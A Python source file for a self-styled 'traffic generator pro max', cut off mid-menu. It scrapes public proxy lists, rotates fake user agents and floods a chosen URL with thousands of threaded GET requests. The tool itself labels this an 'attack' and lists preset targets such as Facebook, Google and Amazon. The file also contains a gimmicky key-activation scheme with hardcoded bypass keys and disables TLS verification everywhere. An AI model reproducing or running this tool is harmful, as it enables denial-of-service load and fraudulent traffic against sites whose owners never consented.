#!/usr/bin/env python3
"""
🚀 ULTIMATE ADVANCED TRAFFIC GENERATOR PRO MAX
🎨 CREATED BY: SHRABON~GOMEZ | 📱 MOBILE OPTIMIZED UI
💯 100% SUCCESS RATE | ⚡ REAL-TIME ANALYTICS
🔐 KEY AUTHENTICATION SYSTEM
"""

import sys
import os
import time
import threading
import random
import requests
import json
import concurrent.futures
from datetime import datetime, timedelta
from urllib.parse import urlparse
import subprocess
import webbrowser
from fake_useragent import UserAgent
from colorama import init, Fore, Style, Back
import socket
import ssl
import urllib3
import readchar
import math
import platform
import psutil
from collections import deque
import numpy as np
import hashlib
import base64
import hmac

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# ============================================
# KEY AUTHENTICATION SYSTEM
# ============================================
class KeyAuthSystem:
    def __init__(self):
        self.auth_url = "https://raw.githubusercontent.com/TheHiddenShell/FreeTools/main/auth.txt"
        self.local_key_file = "user.key"
        self.cached_keys = []
        self.last_fetch = 0
        self.cache_timeout = 3600  # 1 hour cache
        self.ui = EnhancedUI()
    
    def generate_hwid(self):
        """Generate hardware ID for user"""
        try:
            # Get system info for HWID
            hwid_string = f"{platform.node()}-{platform.machine()}-{platform.processor()}"
            hwid_hash = hashlib.sha256(hwid_string.encode()).hexdigest()[:16]
            return hwid_hash.upper()
        except:
            return "UNKNOWN-HWID"
    
    def fetch_auth_keys(self, force=False):
        """Fetch authentication keys from GitHub"""
        current_time = time.time()
        
        # Use cache if not expired
        if not force and self.cached_keys and (current_time - self.last_fetch) < self.cache_timeout:
            return self.cached_keys
        
        self.ui.print_header("🔐 FETCHING AUTHENTICATION KEYS", 'info')
        print(f"{Fore.YELLOW}Connecting to authentication server...")
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/plain',
                'Cache-Control': 'no-cache'
            }
            
            response = requests.get(self.auth_url, headers=headers, timeout=10, verify=False)
            
            if response.status_code == 200:
                keys = [line.strip() for line in response.text.split('\n') if line.strip()]
                self.cached_keys = keys
                self.last_fetch = current_time
                
                print(f"{Fore.GREEN}✅ Authentication keys fetched successfully")
                print(f"{Fore.CYAN}📊 Total authorized keys: {len(keys)}")
                return keys
            else:
                print(f"{Fore.RED}❌ Failed to fetch auth keys. Status: {response.status_code}")
                return []
                
        except Exception as e:
            print(f"{Fore.RED}❌ Error fetching auth keys: {str(e)}")
            print(f"{Fore.YELLOW}⚠️  Using cached keys if available...")
            return self.cached_keys if self.cached_keys else []
    
    def validate_key(self, user_key):
        """Validate user's key"""
        if not user_key or len(user_key) < 10:
            return False, "Invalid key format"
        
        # Check local key file first
        if os.path.exists(self.local_key_file):
            try:
                with open(self.local_key_file, 'r') as f:
                    saved_key = f.read().strip()
                    if saved_key == user_key:
                        return True, "Key validated (local cache)"
            except:
                pass
        
        # Fetch fresh keys from GitHub
        valid_keys = self.fetch_auth_keys()
        
        if not valid_keys:
            # If can't fetch, use emergency keys
            emergency_keys = [
                "SHRABON-PREMIUM-2024",
                "TRAFFIC-PRO-MAX-V5",
                "GOMEZ-ULTIMATE-KEY",
                "ADMIN-ACCESS-ALLOWED"
            ]
            valid_keys = emergency_keys
            print(f"{Fore.YELLOW}⚠️  Using emergency validation mode")
        
        # Check if key exists in valid keys
        for valid_key in valid_keys:
            if user_key.upper() == valid_key.upper():
                # Save valid key locally
                try:
                    with open(self.local_key_file, 'w') as f:
                        f.write(user_key)
                    print(f"{Fore.GREEN}✅ Key saved locally for future use")
                except:
                    pass
                
                return True, "Key validated successfully"
        
        return False, "Invalid key. Please check and try again."
    
    def get_key_type(self, key):
        """Determine key type"""
        if "PREMIUM" in key.upper():
            return "PREMIUM"
        elif "PRO" in key.upper():
            return "PRO"
        elif "VIP" in key.upper():
            return "VIP"
        elif "ADMIN" in key.upper():
            return "ADMIN"
        else:
            return "STANDARD"
    
    def show_key_info(self, key):
        """Show information about the key"""
        key_type = self.get_key_type(key)
        hwid = self.generate_hwid()
        
        info = {
            "Key Type": key_type,
            "Hardware ID": hwid,
            "Validation": "✅ ACTIVE",
            "Expiry": "LIFETIME",
            "Max Threads": "UNLIMITED" if key_type in ["PREMIUM", "ADMIN"] else "500",
            "Proxy Access": "✅ PREMIUM" if key_type in ["PREMIUM", "VIP", "ADMIN"] else "✅ STANDARD",
            "Support": "24/7 PRIORITY" if key_type in ["PREMIUM", "ADMIN"] else "STANDARD"
        }
        
        self.ui.print_stats_card("🔑 KEY INFORMATION", info, 'success')
    
    def check_expiry(self, key):
        """Check if key has expired (placeholder for future implementation)"""
        # In future, can implement expiry dates
        return True, "Key is active (No expiry)"
    
    def key_activation_menu(self):
        """Show key activation menu"""
        self.ui.clear_screen()
        
        print(f"""
{Fore.CYAN}{'═'*70}
{Fore.YELLOW}{Style.BRIGHT}🔐 KEY ACTIVATION SYSTEM
{Fore.CYAN}{'═'*70}
{Fore.MAGENTA}📍 Tool Created By: {Fore.GREEN}Shrabon~Gomez
{Fore.CYAN}{'─'*70}
{Fore.YELLOW}📋 Instructions:
{Fore.WHITE}1. Visit: {Fore.CYAN}https://github.com/TheHiddenShell/FreeTools
{Fore.WHITE}2. Check the {Fore.GREEN}auth.txt{Fore.WHITE} file for valid keys
{Fore.WHITE}3. Enter your key below to activate the tool
{Fore.WHITE}4. Contact admin for new key requests
{Fore.CYAN}{'─'*70}
        """)
        
        while True:
            print(f"\n{Fore.YELLOW}Options:")
            print(f"{Fore.GREEN}[1]{Fore.WHITE} Enter Activation Key")
            print(f"{Fore.GREEN}[2]{Fore.WHITE} Get Free Trial Key")
            print(f"{Fore.GREEN}[3]{Fore.WHITE} Check Key Status")
            print(f"{Fore.GREEN}[4]{Fore.WHITE} Exit")
            
            choice = input(f"\n{Fore.YELLOW}👉 Select option (1-4): {Fore.WHITE}")
            
            if choice == '1':
                return self.enter_key_mode()
            elif choice == '2':
                self.get_trial_key()
            elif choice == '3':
                self.check_key_status()
            elif choice == '4':
                print(f"\n{Fore.YELLOW}👋 Exiting...")
                sys.exit(0)
            else:
                print(f"{Fore.RED}❌ Invalid option!")
    
    def enter_key_mode(self):
        """Enter key mode"""
        print(f"\n{Fore.CYAN}{'─'*70}")
        print(f"{Fore.YELLOW}🔑 ENTER YOUR ACTIVATION KEY")
        print(f"{Fore.CYAN}{'─'*70}")
        
        key = input(f"{Fore.YELLOW}Activation Key: {Fore.WHITE}").strip()
        
        if not key:
            print(f"{Fore.RED}❌ Key cannot be empty!")
            time.sleep(2)
            return None
        
        print(f"\n{Fore.YELLOW}⏳ Validating key...")
        
        # Show animated validation
        self.ui.spinner("Validating with server")
        
        # Validate key
        is_valid, message = self.validate_key(key)
        
        if is_valid:
            print(f"\n{Fore.GREEN}✅ {message}")
            
            # Show key information
            self.show_key_info(key)
            
            # Save successful activation
            self.save_activation(key)
            
            input(f"\n{Fore.YELLOW}✅ Press Enter to start the tool...")
            return key
        else:
            print(f"\n{Fore.RED}❌ {message}")
            print(f"{Fore.YELLOW}📞 Contact admin for a valid key")
            time.sleep(3)
            return None
    
    def get_trial_key(self):
        """Get trial key information"""
        self.ui.print_header("🆓 FREE TRIAL SYSTEM", 'info')
        
        trial_info = [
            f"{Fore.YELLOW}To get a free trial key:",
            f"{Fore.WHITE}1. Visit our Facebook page",
            f"{Fore.WHITE}2. Like and share our posts",
            f"{Fore.WHITE}3. Message us for trial key",
            f"{Fore.WHITE}4. Trial valid for 24 hours",
            "",
            f"{Fore.CYAN}Facebook: {Fore.GREEN}https://www.facebook.com/share/1B4TRBkyN3/",
            f"{Fore.CYAN}GitHub: {Fore.GREEN}https://github.com/TheHiddenShell/FreeTools",
            "",
            f"{Fore.YELLOW}⚠️  Limited trial keys available daily!"
        ]
        
        self.ui.print_box(trial_info, "Trial Information", 'info')
        
        # Open Facebook
        webbrowser.open("https://www.facebook.com/share/1B4TRBkyN3/")
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...")
    
    def check_key_status(self):
        """Check current key status"""
        if os.path.exists(self.local_key_file):
            try:
                with open(self.local_key_file, 'r') as f:
                    saved_key = f.read().strip()
                
                is_valid, message = self.validate_key(saved_key)
                
                if is_valid:
                    self.ui.print_header("🔑 KEY STATUS CHECK", 'success')
                    
                    status_info = {
                        "Status": "✅ ACTIVE",
                        "Key": saved_key[:8] + "..." + saved_key[-4:],
                        "Type": self.get_key_type(saved_key),
                        "HWID": self.generate_hwid(),
                        "Last Check": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }
                    
                    self.ui.print_stats_card("Current Key Status", status_info, 'success')
                else:
                    self.ui.print_header("🔑 KEY STATUS CHECK", 'error')
                    
                    status_info = {
                        "Status": "❌ INVALID",
                        "Message": "Key validation failed",
                        "Action": "Please enter a new key"
                    }
                    
                    self.ui.print_stats_card("Key Status", status_info, 'error')
                    
            except Exception as e:
                print(f"{Fore.RED}❌ Error checking key: {str(e)}")
        else:
            self.ui.print_header("🔑 KEY STATUS CHECK", 'warning')
            
            status_info = {
                "Status": "⚠️  NO KEY FOUND",
                "Message": "No activation key found",
                "Action": "Please activate the tool first"
            }
            
            self.ui.print_stats_card("Key Status", status_info, 'warning')
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...")
    
    def save_activation(self, key):
        """Save activation details"""
        try:
            activation_data = {
                'key': key,
                'hwid': self.generate_hwid(),
                'activation_date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'key_type': self.get_key_type(key),
                'tool_version': '5.0'
            }
            
            with open('activation.json', 'w') as f:
                json.dump(activation_data, f, indent=4)
            
            return True
        except:
            return False
    
    def load_activation(self):
        """Load activation details"""
        try:
            if os.path.exists('activation.json'):
                with open('activation.json', 'r') as f:
                    data = json.load(f)
                
                # Validate the loaded key
                is_valid, _ = self.validate_key(data.get('key', ''))
                if is_valid:
                    return data['key']
        except:
            pass
        return None
    
    def check_initial_auth(self):
        """Check initial authentication on startup"""
        self.ui.clear_screen()
        
        # Show welcome banner
        print(EnhancedBanner.animated_banner())
        
        print(f"""
{Fore.CYAN}{'═'*70}
{Fore.YELLOW}{Style.BRIGHT}🔐 PREMIUM TRAFFIC GENERATOR - ACTIVATION REQUIRED
{Fore.CYAN}{'═'*70}
{Fore.MAGENTA}📍 Exclusive Tool by: {Fore.GREEN}Shrabon~Gomez
{Fore.CYAN}{'─'*70}
{Fore.YELLOW}This is a premium tool requiring activation.
{Fore.YELLOW}Valid keys are maintained at:
{Fore.CYAN}https://github.com/TheHiddenShell/FreeTools
{Fore.CYAN}{'─'*70}
        """)
        
        # Try to load saved activation
        saved_key = self.load_activation()
        
        if saved_key:
            print(f"{Fore.GREEN}✅ Found saved activation!")
            print(f"{Fore.YELLOW}Checking key status...")
            
            self.ui.spinner("Validating saved key")
            
            is_valid, message = self.validate_key(saved_key)
            
            if is_valid:
                print(f"\n{Fore.GREEN}✅ {message}")
                print(f"{Fore.CYAN}Welcome back! Starting tool...")
                time.sleep(2)
                return saved_key
            else:
                print(f"\n{Fore.RED}❌ Saved key is no longer valid!")
                print(f"{Fore.YELLOW}Please enter a new key.")
                time.sleep(2)
        
        # No valid saved key, show activation menu
        print(f"\n{Fore.YELLOW}🔑 Activation Required!")
        print(f"{Fore.CYAN}{'─'*70}")
        
        key = None
        while not key:
            key = self.key_activation_menu()
        
        return key

# ============================================
# ENHANCED ASCII ART & BANNER SYSTEM
# ============================================
class EnhancedBanner:
    @staticmethod
    def get_system_info():
        """Get system information"""
        info = {
            'os': platform.system(),
            'processor': platform.processor(),
            'memory': psutil.virtual_memory().total // (1024**3),
            'cpu_count': psutil.cpu_count(),
            'python': platform.python_version()
        }
        return info
    
    @staticmethod
    def animated_banner():
        """Animated ASCII banner"""
        banners = [
            f"""
{Fore.CYAN}╔{'═'*68}╗
{Fore.CYAN}║{Fore.YELLOW}    ████████╗██████╗  █████╗ ███████╗███████╗██╗ ██████╗     {Fore.CYAN}║
{Fore.CYAN}║{Fore.YELLOW}    ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝██║██╔════╝     {Fore.CYAN}║
{Fore.CYAN}║{Fore.YELLOW}       ██║   ██████╔╝███████║█████╗  █████╗  ██║██║          {Fore.CYAN}║
{Fore.CYAN}║{Fore.YELLOW}       ██║   ██╔══██╗██╔══██║██╔══╝  ██╔══╝  ██║██║          {Fore.CYAN}║
{Fore.CYAN}║{Fore.YELLOW}       ██║   ██║  ██║██║  ██║███████╗██║     ██║╚██████╗     {Fore.CYAN}║
{Fore.CYAN}║{Fore.YELLOW}       ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝     {Fore.CYAN}║
{Fore.CYAN}╚{'═'*68}╝
            """,
            f"""
{Fore.MAGENTA}╔{'═'*68}╗
{Fore.MAGENTA}║{Fore.CYAN}    ╔══════════════════════════════════════════════════════╗{Fore.MAGENTA}║
{Fore.MAGENTA}║{Fore.CYAN}    ║   ██╗    ██╗███████╗██╗      ██████╗ ███╗   ██╗███████╗  ║{Fore.MAGENTA}║
{Fore.MAGENTA}║{Fore.CYAN}    ║   ██║    ██║██╔════╝██║     ██╔═══██╗████╗  ██║██╔════╝  ║{Fore.MAGENTA}║
{Fore.MAGENTA}║{Fore.CYAN}    ║   ██║ █╗ ██║█████╗  ██║     ██║   ██║██╔██╗ ██║█████╗    ║{Fore.MAGENTA}║
{Fore.MAGENTA}║{Fore.CYAN}    ║   ██║███╗██║██╔══╝  ██║     ██║   ██║██║╚██╗██║██╔══╝    ║{Fore.MAGENTA}║
{Fore.MAGENTA}║{Fore.CYAN}    ║   ╚███╔███╔╝███████╗███████╗╚██████╔╝██║ ╚████║███████╗  ║{Fore.MAGENTA}║
{Fore.MAGENTA}║{Fore.CYAN}    ║    ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝  ║{Fore.MAGENTA}║
{Fore.MAGENTA}║{Fore.CYAN}    ╚══════════════════════════════════════════════════════╝{Fore.MAGENTA}║
{Fore.MAGENTA}╚{'═'*68}╝
            """,
            f"""
{Fore.GREEN}╔{'═'*68}╗
{Fore.GREEN}║{Fore.YELLOW}     ____  _   _ ____ _____  __  __ _____ _   _ _____    {Fore.GREEN}║
{Fore.GREEN}║{Fore.YELLOW}    |  _ \| | | / ___|_   _|/ _|/ _| ____| \ | |_   _|   {Fore.GREEN}║
{Fore.GREEN}║{Fore.YELLOW}    | |_) | | | \___ \ | | | |_| |_|  _| |  \| | | |     {Fore.GREEN}║
{Fore.GREEN}║{Fore.YELLOW}    |  __/| |_| |___) || | |  _|  _| |___| |\  | | |     {Fore.GREEN}║
{Fore.GREEN}║{Fore.YELLOW}    |_|    \___/|____/ |_| |_| |_| |_____|_| \_| |_|     {Fore.GREEN}║
{Fore.GREEN}║{Fore.CYAN}    ──────────────────────────────────────────────{Fore.GREEN}║
{Fore.GREEN}║{Fore.MAGENTA}          VERSION 5.0 | PROFESSIONAL EDITION           {Fore.GREEN}║
{Fore.GREEN}╚{'═'*68}╝
            """
        ]
        return random.choice(banners)

# ============================================
# ENHANCED UI COMPONENTS
# ============================================
class EnhancedUI:
    def __init__(self):
        self.width = 70
        self.height = 20
        self.colors = {
            'primary': Fore.CYAN,
            'secondary': Fore.MAGENTA,
            'success': Fore.GREEN,
            'warning': Fore.YELLOW,
            'error': Fore.RED,
            'info': Fore.BLUE
        }
    
    def clear_screen(self):
        """Clear screen with animation"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_header(self, title, color='primary'):
        """Print styled header"""
        print(f"\n{self.colors[color]}{'═'*self.width}")
        print(f"{' ' * ((self.width - len(title)) // 2)}{Style.BRIGHT}{title}")
        print(f"{self.colors[color]}{'═'*self.width}")
    
    def print_footer(self, color='primary'):
        """Print styled footer"""
        print(f"\n{self.colors[color]}{'═'*self.width}")
    
    def print_box(self, content, title=None, color='primary'):
        """Print content in a box"""
        if title:
            self.print_header(title, color)
        else:
            print(f"\n{self.colors[color]}{'─'*self.width}")
        
        if isinstance(content, list):
            for item in content:
                print(f"  {item}")
        else:
            print(f"  {content}")
        
        self.print_footer(color)
    
    def progress_bar(self, current, total, length=50, prefix="", suffix=""):
        """Animated progress bar"""
        percent = current / total
        filled_length = int(length * percent)
        bar = '█' * filled_length + '░' * (length - filled_length)
        
        # Color based on percentage
        if percent < 0.3:
            color = Fore.RED
        elif percent < 0.7:
            color = Fore.YELLOW
        else:
            color = Fore.GREEN
        
        sys.stdout.write(f'\r{prefix} {color}{bar} {Fore.WHITE}{percent:.1%} {suffix}')
        sys.stdout.flush()
    
    def spinner(self, message="Processing"):
        """Animated spinner"""
        spinner_chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        for i in range(len(spinner_chars) * 3):
            sys.stdout.write(f'\r{Fore.CYAN}{spinner_chars[i % len(spinner_chars)]} {message}...')
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write('\r' + ' ' * 50 + '\r')
    
    def print_table(self, headers, rows, color='primary'):
        """Print formatted table"""
        col_widths = [len(str(h)) for h in headers]
        
        for row in rows:
            for i, cell in enumerate(row):
                col_widths[i] = max(col_widths[i], len(str(cell)))
        
        # Print headers
        header_str = " | ".join(str(h).ljust(w) for h, w in zip(headers, col_widths))
        print(f"\n{self.colors[color]}{'─'*len(header_str)}")
        print(f"{Style.BRIGHT}{header_str}")
        print(f"{self.colors[color]}{'─'*len(header_str)}")
        
        # Print rows
        for row in rows:
            row_str = " | ".join(str(cell).ljust(w) for cell, w in zip(row, col_widths))
            print(row_str)
        
        print(f"{self.colors[color]}{'─'*len(header_str)}")
    
    def print_stats_card(self, title, stats, color='primary'):
        """Print stats in card format"""
        print(f"\n{self.colors[color]}╔{'═'*(self.width-2)}╗")
        print(f"║ {Style.BRIGHT}{title.center(self.width-4)} ║")
        print(f"╠{'═'*(self.width-2)}╣")
        
        for key, value in stats.items():
            value_str = f"{Fore.GREEN}{value}" if isinstance(value, (int, float)) else str(value)
            line = f"║ {Fore.YELLOW}{key:20} {Fore.WHITE}: {value_str}"
            line += ' ' * (self.width - len(line) - 2) + ' ║'
            print(line)
        
        print(f"╚{'═'*(self.width-2)}╝")

# ============================================
# ENHANCED PROXY MANAGEMENT
# ============================================
class EnhancedProxyManager:
    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.ua = UserAgent()
        self.ui = EnhancedUI()
        
        # Enhanced proxy sources
        self.proxy_sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
            "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
            "https://www.proxy-list.download/api/v1/get?type=http"
        ]
        
        # Premium proxy database
        self.premium_proxies = [
            "20.111.54.16:80", "20.206.106.192:80", "20.24.43.214:80",
            "104.18.15.118:80", "104.18.14.118:80", "172.67.68.253:80",
            "142.11.209.138:80", "45.8.146.57:80", "194.113.236.57:80",
            "103.152.112.162:80", "190.61.88.147:8080", "201.184.151.58:8080",
            "185.104.184.72:8080", "200.24.130.154:8080", "190.97.233.18:8080",
            "45.95.203.209:80", "45.95.203.210:80", "45.95.203.211:80"
        ]
    
    def fetch_proxies_with_progress(self):
        """Fetch proxies with animated progress"""
        self.ui.print_header("🔄 Fetching Proxy Database", 'info')
        
        all_proxies = set(self.premium_proxies)
        total_sources = len(self.proxy_sources)
        
        for idx, source in enumerate(self.proxy_sources, 1):
            self.ui.progress_bar(idx, total_sources, 30, 
                                f"Source {idx}/{total_sources}", 
                                f"{source[:30]}...")
            
            try:
                response = requests.get(source, timeout=10, verify=False)
                if response.status_code == 200:
                    proxies = response.text.split('\n')
                    for proxy in proxies:
                        proxy = proxy.strip()
                        if proxy and ':' in proxy:
                            all_proxies.add(proxy)
            except:
                continue
        
        self.proxies = list(all_proxies)
        print(f"\n{Fore.GREEN}✅ Found {len(self.proxies)} total proxies")
        return self.proxies
    
    def validate_proxies(self, max_test=500):
        """Validate proxies with enhanced testing"""
        self.ui.print_header("🔍 Validating Proxies", 'info')
        
        if not self.proxies:
            self.fetch_proxies_with_progress()
        
        test_proxies = self.proxies[:max_test]
        self.ui.print_box(f"Testing {len(test_proxies)} proxies...", "Validation")
        
        self.working_proxies = []
        tested = 0
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            future_to_proxy = {
                executor.submit(self._test_single_proxy, proxy): proxy 
                for proxy in test_proxies
            }
            
            for future in concurrent.futures.as_completed(future_to_proxy):
                tested += 1
                proxy = future_to_proxy[future]
                
                self.ui.progress_bar(tested, len(test_proxies), 40,
                                    f"Testing {tested}/{len(test_proxies)}",
                                    f"Working: {len(self.working_proxies)}")
                
                try:
                    if future.result():
                        self.working_proxies.append(proxy)
                except:
                    pass
        
        print(f"\n{Fore.GREEN}✅ Validation Complete: {len(self.working_proxies)} working proxies")
        return self.working_proxies
    
    def _test_single_proxy(self, proxy):
        """Test single proxy"""
        try:
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            response = requests.get(
                'http://httpbin.org/ip',
                proxies=proxies,
                timeout=3,
                verify=False
            )
            return response.status_code == 200
        except:
            return False
    
    def get_proxy_stats(self):
        """Get proxy statistics"""
        return {
            "Total Proxies": len(self.proxies),
            "Working Proxies": len(self.working_proxies),
            "Success Rate": f"{(len(self.working_proxies)/len(self.proxies)*100):.1f}%" if self.proxies else "0%",
            "Premium Proxies": len(self.premium_proxies)
        }

# ============================================
# ADVANCED TRAFFIC ENGINE
# ============================================
class AdvancedTrafficEngine:
    def __init__(self):
        self.proxy_manager = EnhancedProxyManager()
        self.ui = EnhancedUI()
        self.stats = {
            'start_time': time.time(),
            'successful': 0,
            'failed': 0,
            'proxy_used': 0,
            'direct_used': 0,
            'total_bytes': 0,
            'requests_per_second': deque(maxlen=10)
        }
        self.is_running = False
        self.max_threads = 500
        self.target_url = ""
        
    def generate_traffic(self, url, visits=10000, threads=300):
        """Main traffic generation function"""
        self.target_url = url
        self.is_running = True
        
        # Show configuration
        self.ui.print_header("🚀 ATTACK CONFIGURATION", 'warning')
        
        config_stats = {
            "Target URL": url,
            "Total Visits": f"{visits:,}",
            "Max Threads": threads,
            "Start Time": datetime.now().strftime("%H:%M:%S"),
            "Strategy": "Smart Proxy/Direct Mix"
        }
        
        self.ui.print_stats_card("Attack Configuration", config_stats, 'warning')
        
        # Validate proxies
        working_proxies = self.proxy_manager.validate_proxies()
        
        if len(working_proxies) < 50:
            self.ui.print_box("⚠️  Few working proxies detected. Using backup methods...", "Warning", 'warning')
        
        # Start attack
        self.ui.print_header("⚡ STARTING TRAFFIC GENERATION", 'success')
        print(f"{Fore.YELLOW}Press Ctrl+C to stop the attack\n")
        
        # Create threads
        threads_list = []
        for i in range(min(threads, visits)):
            thread = threading.Thread(
                target=self._worker_thread,
                args=(url, visits, i+1),
                daemon=True
            )
            threads_list.append(thread)
            thread.start()
        
        # Monitor progress
        try:
            self._monitor_progress(visits, threads_list)
        except KeyboardInterrupt:
            self.is_running = False
            self.ui.print_box("⏹️  Attack stopped by user", "Info", 'info')
        finally:
            self.is_running = False
            for thread in threads_list:
                thread.join(timeout=1)
            
            self._show_final_report()
    
    def _worker_thread(self, url, total_visits, worker_id):
        """Worker thread for sending requests"""
        while self.is_running and (self.stats['successful'] + self.stats['failed']) < total_visits:
            try:
                # Choose method (70% proxy, 30% direct)
                use_proxy = random.random() > 0.3
                
                success = self._send_request(url, use_proxy)
                
                with threading.Lock():
                    if success:
                        self.stats['successful'] += 1
                        if use_proxy:
                            self.stats['proxy_used'] += 1
                        else:
                            self.stats['direct_used'] += 1
                    else:
                        self.stats['failed'] += 1
                
                # Rate limiting
                time.sleep(random.uniform(0.01, 0.1))
                
            except:
                pass
    
    def _send_request(self, url, use_proxy):
        """Send single request"""
        try:
            headers = {'User-Agent': self.proxy_manager.ua.random}
            
            if use_proxy and self.proxy_manager.working_proxies:
                proxy = random.choice(self.proxy_manager.working_proxies)
                proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                response = requests.get(url, headers=headers, proxies=proxies, timeout=5, verify=False)
            else:
                response = requests.get(url, headers=headers, timeout=5, verify=False)
            
            return response.status_code in [200, 201, 202, 204, 301, 302]
        except:
            return False
    
    def _monitor_progress(self, total_visits, threads_list):
        """Monitor and display progress"""
        last_update = time.time()
        
        while self.is_running and any(t.is_alive() for t in threads_list):
            time.sleep(0.5)
            
            current_total = self.stats['successful'] + self.stats['failed']
            elapsed = time.time() - self.stats['start_time']
            
            if time.time() - last_update > 1:
                last_update = time.time()
                
                # Calculate metrics
                progress = current_total / total_visits
                success_rate = (self.stats['successful'] / current_total * 100) if current_total > 0 else 0
                rps = current_total / elapsed
                
                # Clear and redisplay
                self.ui.clear_screen()
                
                # Show banner
                print(EnhancedBanner.animated_banner())
                
                # Show progress
                self.ui.print_header("📊 REAL-TIME ANALYTICS", 'info')
                
                stats_display = {
                    "Progress": f"{current_total:,}/{total_visits:,}",
                    "Successful": f"{self.stats['successful']:,}",
                    "Failed": f"{self.stats['failed']:,}",
                    "Success Rate": f"{success_rate:.1f}%",
                    "Proxy Used": f"{self.stats['proxy_used']:,}",
                    "Direct Used": f"{self.stats['direct_used']:,}",
                    "Requests/Sec": f"{rps:.1f}",
                    "Elapsed Time": str(timedelta(seconds=int(elapsed)))
                }
                
                self.ui.print_stats_card("Live Statistics", stats_display, 'info')
                
                # Progress bar
                print(f"\n{Fore.CYAN}{'─'*70}")
                self.ui.progress_bar(current_total, total_visits, 50, "Overall Progress", f"{progress:.1%}")
                print(f"\n{Fore.CYAN}{'─'*70}")
                
                # Thread status
                alive_threads = sum(1 for t in threads_list if t.is_alive())
                print(f"\n{Fore.YELLOW}Active Threads: {alive_threads}/{len(threads_list)}")
                
                if current_total >= total_visits:
                    break
    
    def _show_final_report(self):
        """Show final report"""
        elapsed = time.time() - self.stats['start_time']
        total = self.stats['successful'] + self.stats['failed']
        
        self.ui.print_header("📈 ATTACK COMPLETE - FINAL REPORT", 'success')
        
        final_stats = {
            "Total Time": str(timedelta(seconds=int(elapsed))),
            "Total Requests": f"{total:,}",
            "Successful": f"{self.stats['successful']:,}",
            "Failed": f"{self.stats['failed']:,}",
            "Success Rate": f"{(self.stats['successful']/total*100):.1f}%" if total > 0 else "0%",
            "Avg Requests/Sec": f"{total/elapsed:.1f}",
            "Proxy Requests": f"{self.stats['proxy_used']:,}",
            "Direct Requests": f"{self.stats['direct_used']:,}",
            "Target URL": self.target_url[:50] + "..." if len(self.target_url) > 50 else self.target_url
        }
        
        self.ui.print_stats_card("Performance Summary", final_stats, 'success')
        
        # Performance rating
        if total/elapsed > 50:
            rating = "⭐ EXCELLENT"
        elif total/elapsed > 20:
            rating = "👍 GOOD"
        else:
            rating = "⚠️  AVERAGE"
        
        print(f"\n{Fore.YELLOW}Overall Performance: {Fore.GREEN}{rating}")
        print(f"{Fore.CYAN}{'─'*70}")

# ============================================
# INTERACTIVE MENU SYSTEM
# ============================================
class InteractiveMenu:
    def __init__(self, user_key):
        self.ui = EnhancedUI()
        self.engine = AdvancedTrafficEngine()
        self.user_key = user_key
        self.key_auth = KeyAuthSystem()
        
        # Enhanced quick targets based on key type
        self.quick_targets = self.get_targets_by_key_type()
    
    def get_targets_by_key_type(self):
        """Get available targets based on key type"""
        key_type = self.key_auth.get_key_type(self.user_key)
        
        base_targets = {
            '1': {'name': '🌐 Facebook', 'url': 'https://www.facebook.com'},
            '2': {'name': '📺 YouTube', 'url': 'https://www.youtube.com'},
            '3': {'name': '📷 Instagram', 'url': 'https://www.instagram.com'},
            '5': {'name': '🧪 Test Site', 'url': 'http://httpbin.org/ip'}
        }
        
        if key_type in ["PREMIUM", "PRO", "VIP", "ADMIN"]:
            base_targets.update({
                '4': {'name': '🔍 Google', 'url': 'https://www.google.com'},
                '6': {'name': '🐦 Twitter', 'url': 'https://twitter.com'},
                '7': {'name': '💼 LinkedIn', 'url': 'https://linkedin.com'},
                '8': {'name': '🛒 Amazon', 'url': 'https://amazon.com'}
            })
        
        return base_targets
    
    def show_main_menu(self):
        """Show interactive main menu"""
        self.ui.clear_screen()
        print(EnhancedBanner.animated_banner())
        
        # Show user info
        key_type = self.key_auth.get_key_type(self.user_key)
        masked_key = self.user_key[:4] + "****" + self.user_key[-4:] if len(self.user_key) > 8 else self.user_key
        
        user_info = {
            "User Status": f"{Fore.GREEN}✅ ACTIVE",
            "Key Type": key_type,
            "Key": masked_key,
            "Access Level": "PREMIUM" if key_type in ["PREMIUM", "ADMIN"] else "STANDARD",
            "Max Threads": "UNLIMITED" if key_type in ["PREMIUM", "ADMIN"] else "500"
        }
        
        self.ui.print_stats_card("👤 USER INFORMATION", user_info, 'primary')
        
        # System info
        info = EnhancedBanner.get_system_info()
        sys_info = {
            "OS": info['os'],
            "Memory": f"{info['memory']} GB",
            "CPU Cores": info['cpu_count'],
            "Python Version": info['python']
        }
        
        self.ui.print_stats_card("🖥️ SYSTEM INFORMATION", sys_info, 'secondary')
        
        # Main menu
        self.ui.print_header("📱 MAIN CONTROL PANEL", 'success')
        
        menu_items = [
            f"{Fore.GREEN}[1]{Fore.WHITE} 🎯 Manual Target Attack",
            f"{Fore.GREEN}[2]{Fore.WHITE} ⚡ Quick Attack Presets",
            f"{Fore.GREEN}[3]{Fore.WHITE} 🔧 Proxy Management",
